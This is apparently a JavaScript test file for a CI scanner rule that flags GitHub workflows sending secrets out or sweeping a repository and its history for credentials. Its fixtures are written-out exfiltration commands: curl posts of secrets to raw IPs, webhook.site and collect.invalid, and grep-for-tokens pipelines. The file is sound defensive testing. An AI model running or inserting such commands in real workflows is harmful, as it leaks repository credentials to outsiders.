// Workflows that send named secrets out, or search the repository for credentials and send what they find
// (RA-1, SC-WORKFLOW-EXFIL): the engine's reading (ci/exfil.rs) as the npm package asks it, the cases of
// tests/scanner/test_workflow_exfil.py. Inert text only: documentation addresses, made-up secret names.

import { test } from "node:test";
import assert from "node:assert/strict";
import { call } from "../src/lib/native.js";
import { ciIssues } from "../src/scanner/scan.js";

const exfil = (text) => call("ci_workflow", {}, text).findings.filter(([k]) => k === "exfil" || k === "sweep");

const HTTP_IP = "http://203.0.113.7:8080/c";
const wf = (steps, env = "") => "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n" + env + "    steps:\n" + steps;
const run = (script) => "      - run: |\n" + script.split("\n").map((l) => "          " + l + "\n").join("");
const kinds = (text) => exfil(text).map(([k, line, d]) => (k === "exfil" ? [k, line, d.names, d.plain, d.raw_ip] : [k, line]));
const issues = (text) => ciIssues(".github/workflows/w.yml", text.split("\n"))
  .filter((i) => i.rule === "SC-WORKFLOW-EXFIL").map((i) => [i.sev, i.line, i.msg]);

test("named secrets in one request to a raw IP, directly and through the environment", () => {
  const text = wf(run(`curl -s -X POST -d "host=\${{ secrets.VPS_HOST }}&key=\${{ secrets.VPS_SSH_KEY }}" ${HTTP_IP}`));
  assert.deepEqual(kinds(text), [["exfil", 7, ["VPS_HOST", "VPS_SSH_KEY"], "http", true]]);
  assert.deepEqual(issues(text), [["CRITICAL", 7,
    `The job "a" sends the secrets VPS_HOST and VPS_SSH_KEY out with curl to ${HTTP_IP} (over plain HTTP, to a raw ` +
    "IP address, 2 secrets in one request): GhostAction's workflows sent repositories' secrets this way."]]);
  const env = wf("      - env:\n          H: ${{ secrets.VPS_HOST }}\n          K: ${{ secrets.VPS_SSH_KEY }}\n" +
    `        run: curl -s -d "h=$H&k=\${K}" ${HTTP_IP}\n`);
  assert.deepEqual(kinds(env), [["exfil", 9, ["VPS_HOST", "VPS_SSH_KEY"], "http", true]]);
});

test("the repository and its history searched for credentials and sent", () => {
  const piped = wf(run("grep -rEho '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36})' . | curl --data-binary @- http://203.0.113.9/r"));
  assert.deepEqual(kinds(piped), [["sweep", 7]]);
  const history = wf(run("git log -p --all > hist.txt\ngrep -iE 'password|token' hist.txt > found.txt") +
    run("curl -F f=@found.txt https://collect.invalid/u"));
  assert.deepEqual(issues(history), [["CRITICAL", 10,
    "The job \"a\" searches the repository for credentials (`grep -iE 'password|token' hist.txt > found.txt`) and " +
    "sends what it finds out with curl: GhostAction's workflows swept repositories and their history this way."]]);
});

test("how it is rated", () => {
  assert.deepEqual(issues(wf(run('curl -d "v=${{ secrets.FOO }}" https://collect.invalid/x'))), [["MAJOR", 7,
    'The job "a" sends the secret FOO out with curl to https://collect.invalid/x, not as a credential of that ' +
    "service: check that this is the service the secret is for."]]);
  assert.deepEqual(issues(wf(run('curl -d "v=${{ secrets.FOO }}" https://webhook.site/abc'))), [["CRITICAL", 7,
    'The job "a" sends the secret FOO out with curl to https://webhook.site/abc (to webhook.site, a data-capture ' +
    "service): GhostAction's workflows sent repositories' secrets this way."]]);
});

test("what is not a secret sent out", () => {
  for (const script of [
    'curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.example.invalid/x',
    "curl -u user:${{ secrets.NEXUS_PASS }} -T pkg.tgz https://nexus.example.invalid/repo/",
    "curl -X POST -d '{\"text\":\"done\"}' ${{ secrets.SLACK_WEBHOOK_URL }}",
    "curl https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }}",
    'curl -X POST https://oauth2.googleapis.com/token -d "client_secret=${{ secrets.CHROME_CLIENT_SECRET }}"',
    'curl -d "p=${{ secrets.DB_PASS }}" http://localhost:5432/x',
    "grep -r 'password' src/ && exit 1 || true",
    'curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/x | jq -r .url | xargs curl -L -o a.zip',
  ]) assert.deepEqual(kinds(wf(run(script))), [], script);
});
